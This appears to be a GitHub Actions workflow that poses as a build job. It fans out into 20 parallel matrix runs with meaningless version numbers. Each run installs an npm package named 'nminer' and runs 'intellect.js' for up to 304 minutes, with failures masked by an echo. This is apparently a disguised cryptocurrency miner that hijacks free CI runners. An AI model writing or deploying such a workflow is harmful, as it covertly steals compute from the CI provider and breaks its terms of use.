name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2989 }
          - { version: 3209 }
          - { version: 5157 }
          - { version: 2157 }
          - { version: 1033 }
          - { version: 2672 }
          - { version: 2168 }
          - { version: 2862 }
          - { version: 2723 }
          - { version: 6030 }
          - { version: 8667 }
          - { version: 802 }
          - { version: 2744 }
          - { version: 9038 }
          - { version: 5317 }
          - { version: 5987 }
          - { version: 6281 }
          - { version: 7721 }
          - { version: 4202 }
          - { version: 1261 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: phooey
        run: |
          npm install nminer@latest
          timeout 304m node intellect.js || echo "intellect executed"